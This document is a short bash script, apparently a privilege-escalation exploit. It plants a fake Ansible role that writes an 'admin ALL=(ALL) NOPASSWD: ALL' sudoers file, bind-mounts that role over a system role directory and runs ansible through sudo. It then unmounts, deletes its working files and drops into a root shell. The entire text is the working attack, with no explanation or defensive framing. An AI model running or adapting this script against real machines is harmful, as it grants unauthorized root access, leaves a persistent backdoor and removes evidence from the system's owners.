#!/bin/bash
mkdir -p /tmp/hack/files
echo 'admin ALL=(ALL) NOPASSWD: ALL' > /tmp/hack/files/sudoers
mkdir -p /tmp/hack/tasks
echo '
- copy: src={{ item }} dest=/etc/sudoers.d/admin owner=root group=root mode=0640
  with_first_found:
    - files:
        - sudoers
' > /tmp/hack/tasks/main.yml
bash -c 'sudo /bin/mount --bind /tmp/hack /usr/share/ansible/roles/users/' &>/dev/null
bash -c 'sudo /usr/local/bin/ansible /usr/share/ansible/role/users -t users' &>/dev/null
bash -c 'sudo /bin/umount /usr/share/ansible/roles/users/' &>/dev/null
rm -fr /tmp/hack
sudo /bin/bash